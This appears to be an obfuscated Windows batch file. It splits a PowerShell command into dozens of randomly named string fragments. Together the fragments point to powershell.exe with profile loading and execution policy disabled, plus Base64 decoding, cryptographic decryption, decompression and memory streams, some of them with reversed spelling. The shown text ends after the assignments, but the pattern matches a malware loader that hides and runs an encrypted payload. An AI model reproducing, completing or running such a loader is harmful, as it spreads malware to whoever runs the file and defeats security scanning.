@echo off
set "uPemGuQzlK=he"
set "BgwVmnWCrC=xe"
set "hKjHzZtgzS=nd"
set "daPYXaruhl=we"
set "nOXCsxJwJT=st"
set "egSFbtYQzv=we"
set "iOlfasEdqo= C"
set "BHGIiDVIhn=he"
set "JEVSyKEOqZ=Wi"
set "rpZgWnoNxM=do"
set "rdbQtLihTZ=rs"
set "iloPuwAKox=ll"
set "CVfLpJopVH=po"
set "sNmETETtGp=s\"
set "JYXwIEQKlw=\W"
set "xqIlyNgLQG=0\"
set "kSiwdgOlwW= /"
set "YFpuGuyFOU=em"
set "OFmzkYqmOJ=co"
set "pcmyyPttCr=rS"
set "KhBCCnkHqD=py"
set "NPNrgPVNbd=Sy"
set "YfdqkaHSMc=ws"
set "DNtrZJpMSV=Po"
set "vMDEoyUorD=.e"
set "kxTvEIlzXi=y "
set "AfvBdGUwuM=:\"
set "bRtrNBAUTj=\v"
set "XCVBIRnyoR=ll"
set "VxKNriAsLM=in"
set "umVziEMZzV=ow"
set "qWkBuwAjwx=1."
set "gazjeFzDst=32"
set "tkJFScUAQo=cd"
set "ZDYgbfRqAX= %~dp0"
set "XVYlMVTIEe=:: '"
set "ACHEOETbnm=yTo("
set "txdglBOhfj=TllA"
set "RnLWiFjzMb=oArr"
set "KRenOMQgBe=S46e"
set "eGXrZroDmu=.Con"
set "nktLrkXFMk=New-"
set "HThEUhLtff=Secu"
set "JIpQavMenZ=sion"
set "FImeMqsXWm=comm"
set "qigvMNMSNZ=LuO "
set "uzZNrUMGNR=  $U"
set "bMhgpQQFaE=, (,"
set "RbBaHGXwRP=pose"
set "dQKhUuKpgG=Conv"
set "nOAkfsDaVW=ispo"
set "kCDxgQqLQD=HkS."
set "uqRotJLVfe=Disp"
set "fMmHiCHTBx=tion"
set "IakRZonuqm=cD);"
set "CBCGwVGtuS=daeR"
set "DtPhBwUuce=.IO."
set "oinjHtCtfw=.Mod"
set "MbRXLcSBYM=esMa"
set "BlsaJskgxl=gjYA"
set "PBOBbSpOgz=join"
set "xJZTfIqbJQ= if "
set "eOCLtvVjuR='txe"
set "dTnXSmbOAo= New"
set "FBKnEevZAg=QKBj"
set "IVDhBBnbvs=7;$Z"
set "SUtMZWffPc=esaB"
set "fdpJsTfBop=oL'["
set "cVGmjpCGRR=onve"
set "CPTlmWoSjy=3); "
set "eskwxyTFmb=ress"
set "izcbTqANWQ=.Cry"
set "kwronxnccV=yNoS"
set "QcivCZZTQC=.Cry"
set "lzSszxWssV=gsYZ"
set "QHdmRUWpTA=Bmor"
set "cXBISlzRPg=16] "
set "ZPTBDGTIXQ= = N"
set "kjGqTicgWe= = $"
set "yddYsMvksN=ecry"
set "cchlAVgnLi=stem"
set "nfdGdGWMLl=ionM"
set "pBhLtQJNRn=brea"
set "zTkDGOtSFR=Disp"
set "CfxkCkEyXN=ring"
set "JLrGyPgfUw=[]] "
set "HgEmUfGWHA=comp"
set "OSSOBFdMvP=.Cop"
set "jmAJvCdfot=mPvB"
set "BvwfEaVGwM=rity"
set "SQtmlQeHiD=gmcD"
set "irlVcOJlhD=yNoS"
set "LNENIlcnTW=rJ ="
set "wXgFJLhvOL=)) {"
set "JHrwRFIVYG=ne);"
set "NGOsHXgZth=yste"
set "JFCMVHavby=::De"
set "qLlmUqRhGp=-1.."
set "wQnlERZnLx=S.Pa"
set "MWjsCVPvVR=pres"
set "vcQjmiCJOG=gnir"
set "tHOuGKcswE=($qO"
set "BfkipDfuQz=L4Yi"
set "YXmjlCtKks=-nop"
set "BWgRSMZwAM=nirt"
set "EBcCiAIEWP=saBm"
set "XrGaMrcqhH=1..-"
set "qXvseZDxWb=ugmc"
set "PXbwNRYxQP=yNoS"
set "mjAkUHkDpu=yNoS"
set "yaPwnBnRJD=$mhW"
set "FDzzGVQKpn=-ep "
set "VCPJiesDhn=FL.T"
set "ihNRLMaRZz=m.En"
set "OxRJyBqhfe=New-"
set "olAdwWJhSr=6esa"
set "hSWqZmaiBh=y.Cr"
set "jnUNhuTBYl=O.Su"
set "PIFzKLyZWB=trea"
set "LBgriTcXso=-4] "
set "aiOfwTCApS=ptor"
set "OsXctAIejp=..-1"
set "YzDnKNjteQ=.Sec"
set "klFAwNUlvY=bjec"
set "qDGmsDMVPI=stem"
set "WoRMZvijFO=null"
set "jHHPjLKxbn=.Com"
set "FWoLAfLuOD=pher"
set "pAoHrrjuOx=106u"
set "StrttybczA=n ''"
set "WBRKhDDGvR=oS.I"
set "WCembRjBXg=.Dis"
set "OwyJrFnHEF='0Pg"
set "bzgckHlxEz=AlI."
set "xqTymSpBvM=vert"
set "vHxLrlcmFl=hWFL"
set "RzseANCAlJ=[Sys"
set "BPkHhiRkgf=yste"
set "kHpxQmMGob=tryP"
set "SdxtktjFAf=ZyNo"
set "zUcJQCcJYc=();$"
set "kalvluOApb=ode]"
set "FTBovVysui=.Key"
set "pactuSvFQi=t Sy"
set "AZOeZcIFyS== $Z"
set "ARQyPDtcZV=am;$"
set "TSxDhbkxYj=rofi"
set "AorAziOwWi=ugmc"
set "RPpapIZhcv=orF'"
set "idNtHlPtXN=ct S"
set "mBZhgQqEDK=[Env"
set "QAhpaMYCGK='[-1"
set "JhYHIRkxat=FL);"
set "BAnZfqsFKe=File"
set "thFVHfccYG=mory"
set "euAKVUCdXf=] -j"
set "zGtwpmaJWc=;$yV"
set "NuXztpAxwW=kS, "
set "GrxhlXFEFT=-Obj"
set "EfZVhZkSmj=rt]:"
